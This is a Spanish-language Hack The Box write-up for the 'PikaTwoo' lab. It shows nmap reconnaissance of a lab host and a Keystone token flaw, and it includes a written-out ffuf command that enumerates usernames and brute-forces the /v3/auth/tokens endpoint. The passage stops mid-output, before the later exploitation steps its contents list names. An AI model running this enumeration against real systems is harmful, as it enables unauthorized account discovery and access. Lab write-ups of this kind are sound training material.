<!DOCTYPE html>
<head>

  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

    
    <link rel="icon" type="image/png" href="/images/LL2.png" />
<link rel="shortcut icon" type="image/png" href="/images/LL2.png" />

    
    
    <title>Rug4lo</title>
    
    
    <meta name="author" content="Rug4lo" /> 
     
    
    <meta name="description" content="Rug4lo&#39;s Website" /> 
    
    
    <meta name="keywords" content="Information Leakage, Keystone Exploitation, Android Hacking, APK Vulneration, SSL Bypass, Signature Bypass, SQLI, APISIX Exploitation, LFI to RCE, Nginx Exploitation, Kubernetes Exploitation" />
    
    <meta property="og:title" content="HTB - PikaTwoo" />
<meta property="og:description" content="Contenido Reconocimiento Explotación del Keystone Descarga de la app Reconocimiento de la app Bypass del certificado SSL con Frida Bypass de la firma del certificado SQLI al loggin de la app Explotación de APISIX para conseguir la contraseña Abuso del apartado Password Reset Explotación del LFI Paso de LFI a RCE usando nginx Explotacion de Kubernetes y APISIX para salir del contenedor Escalada de privilegios Reconocimiento Primero que todo vamos a empezar con el escaneo básico de nmap" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://rug4lo.github.io/htb/2023/09/htb-pikatwoo/" /><meta property="article:section" content="htb" />
<meta property="article:published_time" content="2023-09-13T07:28:17+08:00" />
<meta property="article:modified_time" content="2023-09-13T07:28:17+08:00" />


    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="HTB - PikaTwoo"/>
<meta name="twitter:description" content="Contenido Reconocimiento Explotación del Keystone Descarga de la app Reconocimiento de la app Bypass del certificado SSL con Frida Bypass de la firma del certificado SQLI al loggin de la app Explotación de APISIX para conseguir la contraseña Abuso del apartado Password Reset Explotación del LFI Paso de LFI a RCE usando nginx Explotacion de Kubernetes y APISIX para salir del contenedor Escalada de privilegios Reconocimiento Primero que todo vamos a empezar con el escaneo básico de nmap"/>
<meta name="twitter:site" content="@onevcat"/>


    
    
    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/disqusjs@1.3.0/dist/disqusjs.css" />
    
    

    
    
    <link rel="stylesheet" href="https://rug4lo.github.io/scss/main.min.adb360f36911df977062e96eb4e21330ce1615c54d3dd63c070161b63452c73b.css" integrity="sha256-rbNg82kR35dwYulutOITMM4WFcVNPdY8BwFhtjRSxzs=" crossorigin="anonymous" media="screen">
	<link href="//netdna.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet">
</head>
  
</head>
<body>

  <script>
    window.onload = function() {
      if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
        
        var mensaje = document.createElement('div');
        mensaje.innerHTML = 'Esta página no se visualiza bien en dispositivos móviles. Por favor, visita desde un ordenador.';
        document.body.appendChild(mensaje);
      }
    };
  </script>  
  
  <header class="  panel-cover panel-cover--collapsed " style="background-image: url('/images/background-cover.jpg')">

    <div class="panel-main">
  
      <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">
  
          <a href="/#blog" title="Homepage of Rug4lo " class="blog-button"><img src="/images/avatar.jpg" width="80" alt="Rug4lo logo" class="panel-cover__logo logo" /></a>
          <h1 class="panel-cover__title panel-title"><a href="/#blog" title="Homepage of Rug4lo" class="blog-button">Rug4lo</a></h1>
          <hr class="panel-cover__divider" />
        <p class="panel-cover__description">Hacker  •  Red teamer  •  Pentester</p>
          <hr class="panel-cover__divider panel-cover__divider--secondary" /> 
          <div class="navigation-wrapper">
            <div>
              <nav class="cover-navigatio cover-navigation--primary">
                <ul class="navigation">
                  <li class="navigation__item"><a href="/writeups" title='Writeups' class="sblog-button">Writeups</a></li>
                  <li class="navigation__item"><a href="/blog" title='Blog' class="sblog-button">Blog</a></li>
                  <li class="navigation__item"><a href="/#whoami" title='Whoami' class="blog-button">About</a></li>
                </ul>
              </nav>
            </div>
              <div>
                <nav class="cover-navigatio cover-navigation--primary">
                  <ul class="navigation">
                    <li class="navigation__item"><a href="https://app.hackthebox.com/users/1478590" title="Rug4lo" target="_blank" class="sblog-button">HTB</a></li>
                    <li class="navigation__item"><a href="/" title='Home' class="sblog-button">Home</a></li>
                  </ul>
                </nav>
              </div>
            
            <div><nav class="cover-navigation navigation--social">
    <ul class="navigation">
  
    
    
    <li class="navigation__item">
      <a href="https://github.com/Rug4lo" title="Github" target="_blank">
        <i class='social fa fa-github'></i>
        <span class="label">Github</span>
      </a>
    </li>
    

    
    
    <li class="navigation__item">
      <a href="https://www.linkedin.com/in/ruben-garcia-lopez-055496279/" title="Linkedin" target="_blank">
        <i class='social fa fa-linkedin'></i>
        <span class="label">Linkedin</span>
      </a>
    </li>
    

    
    
    <li class="navigation__item">
      <a href="mailto:rubengarciavalladolid@gmail.com" title="Correo Electronico" target="_blank">
        <i class='social fa fa-envelope'></i>
        <span class="label">Email</span>
      </a>
    </li>
    
  
    </ul>
  </nav>
  </div>
          </div>
        </div>
      </div>
      
      
      <div class="panel-cover--overlay cover-red"></div>
      
    </div>
  </header>
  


  <div class="content-wrapper">
    <div class="content-wrapper__inner">

        
<article class="post-container post-container--single" itemscope itemtype="http://schema.org/BlogPosting">
    <header class="post-header">
        <br>
        <br>
        <h1 class="post-title">HTB - PikaTwoo</h1>
    </header>
    <section class="post">
        <p><img src="/htb/PikaTwoo/images/logo.png" alt="Pika"></p>
<h2 id="contenido">Contenido</h2>
<ul>
<li><a href="#Reconocimiento">Reconocimiento</a></li>
<li><a href="#Keystone">Explotación del Keystone</a></li>
<li><a href="#Descarga_app">Descarga de la app</a></li>
<li><a href="#Reconocimiento_app">Reconocimiento de la app</a></li>
<li><a href="#SSL">Bypass del certificado SSL con Frida</a></li>
<li><a href="#firma">Bypass de la firma del certificado</a></li>
<li><a href="#SQLI">SQLI al loggin de la app</a></li>
<li><a href="#APISIX">Explotación de APISIX para conseguir la contraseña</a></li>
<li><a href="#Password_Reset">Abuso del apartado Password Reset</a></li>
<li><a href="#LFI">Explotación del LFI</a></li>
<li><a href="#RCE">Paso de LFI a RCE usando nginx</a></li>
<li><a href="#Kubernetes">Explotacion de Kubernetes y APISIX para salir del contenedor</a></li>
<li><a href="#privesc">Escalada de privilegios</a></li>
</ul>
<h2 id="Reconocimiento">Reconocimiento</h2>
<p>Primero que todo vamos a empezar con el escaneo básico de <code>nmap</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -p- --open -sS -min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn -oN allPorts2 10.10.11.199
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-10-12 19:39 CEST
</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 19:39
</span></span><span style="display:flex;"><span>Scanning 10.10.11.199 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Discovered open port 443/tcp on 10.10.11.199
</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 10.10.11.199
</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.10.11.199
</span></span><span style="display:flex;"><span>Discovered open port 8080/tcp on 10.10.11.199
</span></span><span style="display:flex;"><span>Discovered open port 35357/tcp on 10.10.11.199
</span></span><span style="display:flex;"><span>Discovered open port 5672/tcp on 10.10.11.199
</span></span><span style="display:flex;"><span>Discovered open port 4369/tcp on 10.10.11.199
</span></span><span style="display:flex;"><span>Discovered open port 5000/tcp on 10.10.11.199
</span></span><span style="display:flex;"><span>Discovered open port 25672/tcp on 10.10.11.199
</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 19:39, 16.56s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.199
</span></span><span style="display:flex;"><span>Host is up, received user-set <span style="color:#f92672">(</span>0.36s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Scanned at 2023-10-12 19:39:12 CEST <span style="color:#66d9ef">for</span> 17s
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65526</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE      REASON
</span></span><span style="display:flex;"><span>22/tcp    open  ssh          syn-ack ttl <span style="color:#ae81ff">63</span>
</span></span><span style="display:flex;"><span>80/tcp    open  http         syn-ack ttl <span style="color:#ae81ff">63</span>
</span></span><span style="display:flex;"><span>443/tcp   open  https        syn-ack ttl <span style="color:#ae81ff">63</span>
</span></span><span style="display:flex;"><span>4369/tcp  open  epmd         syn-ack ttl <span style="color:#ae81ff">63</span>
</span></span><span style="display:flex;"><span>5000/tcp  open  upnp         syn-ack ttl <span style="color:#ae81ff">63</span>
</span></span><span style="display:flex;"><span>5672/tcp  open  amqp         syn-ack ttl <span style="color:#ae81ff">63</span>
</span></span><span style="display:flex;"><span>8080/tcp  open  http-proxy   syn-ack ttl <span style="color:#ae81ff">63</span>
</span></span><span style="display:flex;"><span>25672/tcp open  unknown      syn-ack ttl <span style="color:#ae81ff">63</span>
</span></span><span style="display:flex;"><span>35357/tcp open  openstack-id syn-ack ttl <span style="color:#ae81ff">63</span>
</span></span></code></pre></div><p>Ahora vamos a usar los scripts básicos de reconocimiento para ver mas información de estos puertos</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -sCV -p22,80,443,4369,5000,5672,8080,25672,35357 10.10.11.199 -oN Targeted
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.93 scan initiated Thu Oct 12 19:02:07 2023 as: nmap -sCV -p22,80,443,4369,5000,5672,8080,25672,35357 -oN Targeted 10.10.11.199</span>
</span></span><span style="display:flex;"><span>WARNING: Service 10.10.11.199:5000 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.199
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.24s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE  VERSION
</span></span><span style="display:flex;"><span>22/tcp    open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> f3922dfd8422d78df6b09e788eb93be7 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 01e43ec06643df25af8a71b83906df9f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 4fec39764e719471befa7ffaa6a81674 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp    open  http     nginx 1.18.0
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0
</span></span><span style="display:flex;"><span>|_http-title: Pikaboo
</span></span><span style="display:flex;"><span>|_http-cors: HEAD GET POST PUT DELETE PATCH
</span></span><span style="display:flex;"><span>443/tcp   open  ssl/http nginx 1.18.0
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>api.pokatmon-app.htb/organizationName<span style="color:#f92672">=</span>Pokatmon Ltd/stateOrProvinceName<span style="color:#f92672">=</span>United Kingdom/countryName<span style="color:#f92672">=</span>UK
</span></span><span style="display:flex;"><span>| Not valid before: 2021-12-29T20:33:08
</span></span><span style="display:flex;"><span>|_Not valid after:  3021-05-01T20:33:08
</span></span><span style="display:flex;"><span>| tls-alpn: 
</span></span><span style="display:flex;"><span>|_  http/1.1
</span></span><span style="display:flex;"><span>|_http-server-header: APISIX/2.10.1
</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#e6db74">&#39;t have a title (text/plain; charset=utf-8).
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| tls-nextprotoneg: 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_  http/1.1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">4369/tcp  open  epmd     Erlang Port Mapper Daemon
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| epmd-info: 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   epmd_port: 4369
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   nodes: 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_    rabbit: 25672
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">5000/tcp  open  rtsp
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| fingerprint-strings: 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   FourOhFourRequest: 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     HTTP/1.0 404 NOT FOUND
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Type: text/html; charset=utf-8
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Vary: X-Auth-Token
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     x-openstack-request-id: req-195255c3-658b-44fc-ae95-c602a1893b72
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;!DOCTYPE HTML PUBLIC &#34;-//W3C//DTD HTML 3.2 Final//EN&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;title&gt;404 Not Found&lt;/title&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;h1&gt;Not Found&lt;/h1&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   GetRequest: 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     HTTP/1.0 300 MULTIPLE CHOICES
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Type: application/json
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Location: http://pikatwoo.pokatmon.htb:5000/v3/
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Vary: X-Auth-Token
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     x-openstack-request-id: req-10e3a45c-8a1f-46cc-82dc-94332d78de7d
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     {&#34;versions&#34;: {&#34;values&#34;: [{&#34;id&#34;: &#34;v3.14&#34;, &#34;status&#34;: &#34;stable&#34;, &#34;updated&#34;: &#34;2020-04-07T00:00:00Z&#34;, &#34;links&#34;: [{&#34;rel&#34;: &#34;self&#34;, &#34;href&#34;: &#34;http://pikatwoo.pokatmon.htb:5000/v3/&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}], &#34;media-types&#34;: [{&#34;base&#34;: &#34;application/json&#34;, &#34;type&#34;: &#34;application/vnd.openstack.identity-v3+json&#34;}]}]}}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   HTTPOptions: 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     HTTP/1.0 200 OK
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Type: text/html; charset=utf-8
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Allow: GET, OPTIONS, HEAD
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Vary: X-Auth-Token
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     x-openstack-request-id: req-d0366dc1-c99b-4be6-b65e-a258c99ac306
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   RTSPRequest: 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     RTSP/1.0 200 OK
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Type: text/html; charset=utf-8
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Allow: GET, OPTIONS, HEAD
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Vary: X-Auth-Token
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     x-openstack-request-id: req-55813e0c-ce41-4c9f-85df-6fd8e088f192
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   SIPOptions: 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_    SIP/2.0 200 OK
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">5672/tcp  open  amqp     RabbitMQ 3.8.9 (0-9)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| amqp-info: 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   capabilities: 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     publisher_confirms: YES
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     exchange_exchange_bindings: YES
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     basic.nack: YES
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     consumer_cancel_notify: YES
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     connection.blocked: YES
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     consumer_priorities: YES
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     authentication_failure_close: YES
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     per_consumer_qos: YES
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     direct_reply_to: YES
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   cluster_name: rabbit@pikatwoo.pokatmon.htb
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   copyright: Copyright (c) 2007-2020 VMware, Inc. or its affiliates.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   information: Licensed under the MPL 2.0. Website: https://rabbitmq.com
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   platform: Erlang/OTP 23.2.6
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   product: RabbitMQ
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   version: 3.8.9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   mechanisms: AMQPLAIN PLAIN
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_  locales: en_US
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">8080/tcp  open  http     nginx 1.18.0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_http-title: Site doesn&#39;</span>t have a title <span style="color:#f92672">(</span>text/html; charset<span style="color:#f92672">=</span>UTF-8<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0
</span></span><span style="display:flex;"><span>25672/tcp open  unknown
</span></span><span style="display:flex;"><span>35357/tcp open  http     nginx 1.18.0
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0
</span></span><span style="display:flex;"><span>| http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>application/json<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>|_Requested resource was http://10.10.11.199:35357/v3/
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span style="display:flex;"><span>SF-Port5000-TCP:V<span style="color:#f92672">=</span>7.93%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>10/12%Time<span style="color:#f92672">=</span>65282698%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>G
</span></span><span style="display:flex;"><span>SF:etRequest,1DC,<span style="color:#e6db74">&#34;HTTP/1\.0\x20300\x20MULTIPLE\x20CHOICES\r\nContent-Type:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20application/json\r\nLocation:\x20http://pikatwoo\.pokatmon\.htb:500
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0/v3/\r\nVary:\x20X-Auth-Token\r\nx-openstack-request-id:\x20req-10e3a4
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:5c-8a1f-46cc-82dc-94332d78de7d\r\n\r\n{\&#34;versions\&#34;:\x20{\&#34;values\&#34;:\x2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\[{\&#34;id\&#34;:\x20\&#34;v3\.14\&#34;,\x20\&#34;status\&#34;:\x20\&#34;stable\&#34;,\x20\&#34;updated\&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF::\x20\&#34;2020-04-07T00:00:00Z\&#34;,\x20\&#34;links\&#34;:\x20\[{\&#34;rel\&#34;:\x20\&#34;self\&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:,\x20\&#34;href\&#34;:\x20\&#34;http://pikatwoo\.pokatmon\.htb:5000/v3/\&#34;}\],\x20\&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:media-types\&#34;:\x20\[{\&#34;base\&#34;:\x20\&#34;application/json\&#34;,\x20\&#34;type\&#34;:\x2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\&#34;application/vnd\.openstack\.identity-v3\+json\&#34;}\]}\]}}&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RTSPRequ
</span></span><span style="display:flex;"><span>SF:est,AC,<span style="color:#e6db74">&#34;RTSP/1\.0\x20200\x20OK\r\nContent-Type:\x20text/html;\x20charse
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:t=utf-8\r\nAllow:\x20GET,\x20OPTIONS,\x20HEAD\r\nVary:\x20X-Auth-Token\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:r\nx-openstack-request-id:\x20req-55813e0c-ce41-4c9f-85df-6fd8e088f192\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:r\n\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>HTTPOptions,AC,<span style="color:#e6db74">&#34;HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20OPTIONS,\x20HEAD\r\nVa
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ry:\x20X-Auth-Token\r\nx-openstack-request-id:\x20req-d0366dc1-c99b-4be
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:6-b65e-a258c99ac306\r\n\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>FourOhFourRequest,180,<span style="color:#e6db74">&#34;HTTP/1\.0\x20404
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20NOT\x20FOUND\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nVar
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:y:\x20X-Auth-Token\r\nx-openstack-request-id:\x20req-195255c3-658b-44fc
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:-ae95-c602a1893b72\r\n\r\n&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&#34;-//W3C//DTD\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20HTML\x203\.2\x20Final//EN\&#34;&gt;\n&lt;title&gt;404\x20Not\x20Found&lt;/title&gt;\n&lt;h
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:1&gt;Not\x20Found&lt;/h1&gt;\n&lt;p&gt;The\x20requested\x20URL\x20was\x20not\x20found\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20manua
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:lly\x20please\x20check\x20your\x20spelling\x20and\x20try\x20again\.&lt;/p&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SIPOptions,12,<span style="color:#e6db74">&#34;SIP/2\.0\x20200\x20OK\r\n\r\n&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Thu Oct 12 19:04:48 2023 -- 1 IP address (1 host up) scanned in 160.88 seconds</span>
</span></span></code></pre></div><p>Podemos ver que tiene un par de subdominios, los cuales voy a añadir al <code>/etc/hots</code></p>
<p><img src="/htb/PikaTwoo/images/1.png" alt="Pika"></p>
<p>Si hacemos un reconocimiento de directorios podremos ver alguna cosa interesante.</p>
<p><img src="/htb/PikaTwoo/images/2.png" alt="Pika"></p>
<p>Podemos también hacer un reconocimiento del puerto <code>8080</code>, en el cual encontraremos un /info, que tendrá esta información</p>
<p><img src="/htb/PikaTwoo/images/3.png" alt="Pika"></p>
<p>Si nos metemos a la pagina principal, podemos clicar en uno de los monstruos</p>
<p><img src="/htb/PikaTwoo/images/4.png" alt="Pika"></p>
<p>Pero si entramos nos encontramos con este error:</p>
<p><img src="/htb/PikaTwoo/images/5.png" alt="Pika"></p>
<p>Si usamos Dustbuster para listar los directorios de la pagina principal, en donde encontraremos un <code>CANGELOG</code>, que si nos lo descargamos veremos esto:</p>
<p><img src="/htb/PikaTwoo/images/6.png" alt="Pika"></p>
<p>Con esto podemos ver que tiene una aplicación en <code>android</code> en beta</p>
<h2 id="Keystone">Explotación del Keystone</h2>
<p>Bien, una vez que hemos reunido esta información podemos ir a comprobar para que sirve el puerto <code>5000</code>, que normalmente se usa para el servicio <code>Keystone</code></p>
<p>Fuente &ndash;&gt; <a href="https://docs.openstack.org/install-guide/firewalls-default-ports.html">https://docs.openstack.org/install-guide/firewalls-default-ports.html</a></p>
<p>Si indagamos en este servicio veremos que tiene una vulnerabilidad que nos puede ser de utilidad</p>
<p>CVE &ndash;&gt; <a href="https://bugs.launchpad.net/keystone/+bug/1688137">https://bugs.launchpad.net/keystone/+bug/1688137</a></p>
<p>Esto nos dice que si mandamos peticiones por post a <code>/v3/auth/tokens</code> con esa data podemos conseguir la token del usuario, para esto hay que mandar varias peticiones, por lo cual vamos hacernos un script en bash que nos automatize este proceso:</p>
<p><img src="/htb/PikaTwoo/images/7.png" alt="Pika"></p>
<p>Cuando lo ejecutemos veremos que en uno de los errores esta el token del usuario admin (recordando que en el script hemos puesto que de usuario sea el <code>admin</code>)</p>
<p><img src="/htb/PikaTwoo/images/8.png" alt="Pika"></p>
<p>Ahora que tenemos el id del usuario admin podemos usar ffuf para ver si hay mas usuarios, para esto usaremos una secuencia del 1 al 10 que definiremos en F<code>1</code> y como <code>F2</code> pondremos la lista de nombres a probar, en mi caso usare una lista de <code>SecLists</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ ./ffuf -u http://10.10.11.199:5000/v3/auth/tokens -H <span style="color:#e6db74">&#34;Content-type: application/json&#34;</span> -w &lt;<span style="color:#f92672">(</span>seq <span style="color:#ae81ff">0</span> 10<span style="color:#f92672">)</span>:F1,/opt/SecLists/Usernames/Names/names.txt:F2 -d <span style="color:#e6db74">&#39;{ &#34;auth&#34;: {&#34;identity&#34;: {&#34;methods&#34;: [&#34;password&#34;], &#34;password&#34;: {&#34;user&#34;: { &#34;name&#34;: &#34;F2&#34;,&#34;domain&#34;: { &#34;id&#34;: &#34;default&#34; },&#34;password&#34;: &#34;fake_passwordF1&#34; } } } } }&#39;</span> -ac
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
